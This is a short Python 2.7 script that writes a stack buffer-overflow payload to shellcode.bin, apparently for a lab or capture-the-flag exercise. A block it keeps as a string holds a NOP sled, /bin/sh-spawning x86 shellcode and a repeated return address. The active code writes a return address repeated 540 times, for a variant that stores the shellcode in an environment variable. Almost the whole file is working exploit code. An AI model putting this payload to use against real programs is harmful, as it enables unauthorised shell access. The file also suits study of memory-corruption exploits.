#!/usr/bin/env python2.7
from struct import *
import sys

# Classic Buffer Overflow
"""
buf = b''
# NOP SLED
buf = b'\x90' * 467
# shellcode
buf += b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b'
buf += b'\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd'
buf += b'\x80\xe8\xdc\xff\xff\xff/bin/sh'
addr = int("0xffffcc30", 16)
buf += pack("I", addr) * 30
"""
# Using Environment Variables
buf = b''
addr = int("0xffffdb80", 16)
buf += pack("I", addr) * 540

#create file.bin with shellcode
with open("shellcode.bin", "wb") as f:
    f.write(buf)


